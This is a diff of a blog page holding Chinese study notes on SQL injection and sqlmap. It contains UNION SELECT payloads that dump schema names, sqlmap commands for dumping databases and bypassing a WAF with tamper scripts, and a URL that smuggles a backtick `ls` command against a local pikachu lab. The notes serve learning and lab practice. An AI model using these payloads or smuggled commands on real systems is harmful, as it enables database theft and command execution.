@@ -199,9 +199,8 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-02-15 09:09:42 / 修改时间：12:04:50" itemprop="dateCreated datePublished" datetime="2023-02-15T09:09:42+08:00">2023-02-15</time>
+              <time title="创建时间：2023-02-15 12:14:57" itemprop="dateCreated datePublished" datetime="2023-02-15T12:14:57+08:00">2023-02-15</time>
             </span>
 
           
@@ -215,7 +214,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="Sqlmap笔记——Edit-by-Hong-zhong"><a href="#Sqlmap笔记——Edit-by-Hong-zhong" class="headerlink" title="Sqlmap笔记——Edit by Hong_zhong"></a>Sqlmap笔记——Edit by Hong_zhong</h2><h4 id="Sqlmap简介："><a href="#Sqlmap简介：" class="headerlink" title="Sqlmap简介："></a>Sqlmap简介：</h4><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
+          <h3 id="SQL注入笔记——Edit-by-Hong-zhong"><a href="#SQL注入笔记——Edit-by-Hong-zhong" class="headerlink" title="SQL注入笔记——Edit by Hong_zhong"></a>SQL注入笔记——Edit by Hong_zhong</h3><p>1、最简单的联合注入</p>
+<p>首先判断闭合类型</p>
+<ul>
+<li>数字型闭合：id&#x3D;1时的结果与id&#x3D;2-1时的结果一致</li>
+<li>字符型闭合：id&#x3D;1时和id&#x3D;1a时一致，再去深入判断具体类型</li>
+</ul>
+<p>判断字段数</p>
+<p>?id&#x3D;1’ order by 1</p>
+<p>?id&#x3D;1’ order by 2</p>
+<p>…….</p>
+<p>直至报错或者无回显</p>
+<p>爆库名</p>
+<p>id&#x3D;-1’ union select 1,2,database() –+</p>
+<p>select后面的1,2,3……根据字段数适当改变</p>
+<p>必背</p>
+<p>爆表名</p>
+<p>group_concat(table_name)联合查询表名</p>
+<p>information_schema.tables数据库中对应的表</p>
+<p>table_schema表的上层数据库</p>
+<p>爆字段名</p>
+<p>group_concat(column_name)联合查询字段名</p>
+<p>information_schema.columns数据库中对应的表</p>
+<p>table_name&#x3D;想查询的表</p>
+<p>kobe’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</p>
+<p>xssblind</p>
+<h2 id="Sqlmap笔记——Edit-by-Hong-zhong"><a href="#Sqlmap笔记——Edit-by-Hong-zhong" class="headerlink" title="Sqlmap笔记——Edit by Hong_zhong"></a>Sqlmap笔记——Edit by Hong_zhong</h2><h4 id="Sqlmap简介："><a href="#Sqlmap简介：" class="headerlink" title="Sqlmap简介："></a>Sqlmap简介：</h4><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
 <p>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</p>
 <h4 id="Sqlmap使用："><a href="#Sqlmap使用：" class="headerlink" title="Sqlmap使用："></a>Sqlmap使用：</h4><h6 id="最基础的Sqlmap的使用如下"><a href="#最基础的Sqlmap的使用如下" class="headerlink" title="最基础的Sqlmap的使用如下:"></a>最基础的Sqlmap的使用如下:</h6><p><code>sqlmap.py -u &quot;url&quot; --dbs --batch</code>  爆库</p>
 <p><code>sqlmap.py -u &quot;url -D 库名 --tables --batch</code>  爆表</p>
@@ -231,18 +255,17 @@
 <p> <code>sqlmap.py -u 登录的地址 --forms </code>自动判断注入</p>
 <p> <code>sqlmap.py -u 登录的地址 --data</code> “指定参数”</p>
 <p>绕过waf防火墙：<code>sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py</code></p>
-<p><img src="/home/hz/.config/Typora/typora-user-images/image-20230215102319913.png" alt="image-20230215102319913"></p>
+<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/afdf7f51a6d74bc08bf7bb4d2ea6896c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
 <h4 id="如何反制Sqlmap（图一乐"><a href="#如何反制Sqlmap（图一乐" class="headerlink" title="如何反制Sqlmap（图一乐"></a>如何反制Sqlmap（图一乐</h4><p>在前面的sqlmap简介中已经提到，sqlmap是一款自动化工具，而最经典的sqlmap使用在命令行中</p>
 <p>这就造成了安全隐患，而这个安全隐患并非sqlmap独占，而是所有命令行工具都有可能面临的威胁</p>
 <h6 id="bash命令"><a href="#bash命令" class="headerlink" title="bash命令"></a>bash命令</h6><p>先来介绍下bash命令</p>
 <p>在bash命令中，某些字符在””中可能会有特殊的含义，例如   <strong>&#96;</strong></p>
 <p>被反引号包裹在其中的字符会被当做系统命令来执行</p>
-<p><img src="/home/hz/.config/Typora/typora-user-images/image-20230215104527141.png" alt="image-20230215104527141"></p>
+<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e8ced69e21c448998fc2dd3d3bc3fb62~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
 <p>那么在sqlmap中也可以这样搞，先用docker拉一个pikachu来</p>
-<p><img src="/home/hz/.config/Typora/typora-user-images/image-20230215103637697.png" alt="image-20230215103637697"></p>
-<p>执行</p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/vul/sqli/sqli_str.php/%60ls%60">http://127.0.0.1:8000/vul/sqli/sqli_str.php\`ls`</a>“</p>
-<p><img src="/home/hz/.config/Typora/typora-user-images/image-20230215105649533.png" alt="image-20230215105649533"></p>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c8364a2dbcb4491eaafd0ac57dc23fb0~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
+<p>执行<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/vul/sqli/sqli_str.php/%60ls%60">http://127.0.0.1:8000/vul/sqli/sqli_str.php\`ls`</a>“</p>
+<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c87c4710d7814d27973de7fcc93bc35c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p>
 <p>在执行sqlmap检测的时候列出了自己当前系统的文件</p>
 <h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6>
       
